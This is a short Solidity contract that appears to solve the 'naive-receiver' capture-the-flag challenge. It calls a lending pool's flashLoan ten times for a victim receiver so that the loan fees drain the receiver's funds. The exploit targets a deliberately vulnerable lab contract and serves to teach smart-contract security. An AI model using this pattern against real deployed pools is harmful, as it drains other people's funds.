// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveAttack {
	NaiveReceiverLenderPool private immutable pool;

	constructor(address payable _pool) {
		pool = NaiveReceiverLenderPool(_pool);
	}

	function attack(address _receiver) external {
		for (uint256 i = 0; i < 10; i++) {
			pool.flashLoan(_receiver, 0);
		}
	}
}
